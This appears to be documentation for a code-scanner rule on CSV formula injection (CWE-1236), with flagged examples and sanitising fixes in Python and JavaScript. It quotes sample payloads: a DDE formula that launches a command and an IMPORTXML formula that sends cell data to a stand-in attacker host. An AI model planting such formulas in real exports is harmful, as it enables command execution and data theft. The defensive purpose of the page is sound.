---
title: "VNX-1236 – CSV Injection (Formula Injection)"
description: "Detect user-controlled data written into CSV files without escaping formula-triggering characters (=, +, -, @), which can execute arbitrary commands when the CSV is opened in a spreadsheet."
---

## Overview

Spreadsheet applications interpret cell values starting with `=`, `+`, `-`, or `@` as formulas. User-supplied data written directly into CSV cells can contain formulas like `=cmd|'/C calc'!A0` (DDE injection) or `=IMPORTXML(CONCAT("http://attacker.com/?", A1), "//x")` that execute when the file is opened. **Severity:** Medium | **CWE:** [CWE-1236 – Improper Neutralization of Formula Elements in a CSV File](https://cwe.mitre.org/data/definitions/1236.html)

## Why This Matters

CSV injection is classified as a medium-severity vulnerability but its impact depends on context. In enterprise environments where finance teams open CSV exports in Excel or LibreOffice, a formula payload can execute OS commands (via DDE), exfiltrate data via HTTP calls, or silently modify other cells. Many bug bounty programs pay for this finding in data export features.

## What Gets Flagged

```python
# FLAGGED: Writing user data to CSV without sanitisation
import csv
writer = csv.writer(output)
writer.writerow([user_name, user_email, user_comment])
# If user_comment = '=cmd|"/C calc"!A0', this becomes a formula
```

```javascript
// FLAGGED: CSV library outputting user data
const csvWriter = createCsvWriter({path: 'out.csv', header: [...]});
csvWriter.writeRecords(userRows);  // rows may contain formula chars
```

```php
// FLAGGED: fputcsv with user input
fputcsv($file, [$_POST['name'], $_POST['notes']]);
```

## Remediation

```python
# SAFE: Sanitise formula-triggering characters
def sanitise_csv_field(value):
    value = str(value)
    if value and value[0] in ('=', '+', '-', '@', '\t', '\r'):
        value = "'" + value  # prefix with single quote to force text
    return value

writer.writerow([sanitise_csv_field(f) for f in row])
```

```javascript
// SAFE: Escape function for CSV fields
function sanitizeCsvField(value) {
    if (typeof value === 'string' && /^[=+\-@\t\r]/.test(value)) {
        return "'" + value;
    }
    return value;
}
const safeRows = userRows.map(row => row.map(sanitizeCsvField));
```
